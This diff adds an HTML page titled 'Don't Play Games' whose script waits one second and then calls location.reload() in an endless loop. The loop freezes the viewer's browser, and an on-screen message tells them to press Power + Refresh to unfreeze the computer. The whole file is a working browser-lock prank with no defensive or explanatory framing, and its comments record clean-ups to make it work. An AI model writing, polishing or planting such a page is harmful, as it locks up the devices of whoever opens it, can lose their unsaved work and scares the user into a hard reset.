@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Don't Play Games</title> <!-- Fixed closing title tag -->
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: black;
+            color: red;
+            font-family: Arial, sans-serif;
+        }
+        h2 {
+            margin: 0;
+        }
+        p {
+            font-size: 1.5em;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+
+<h2>Don't play games. Press Power + Refresh to unfreeze the computer</h2> <!-- Fixed spelling errors -->
+<p id="demo"></p>
+
+<script>
+window.onbeforeunload = function() {
+    localStorage.setItem('x', 1); // Used setItem for clarity
+};
+
+setTimeout(function() {
+    while (true) location.reload(); // Simplified to just 'true'
+}, 1000);
+</script>
+
+</body>
+</html>
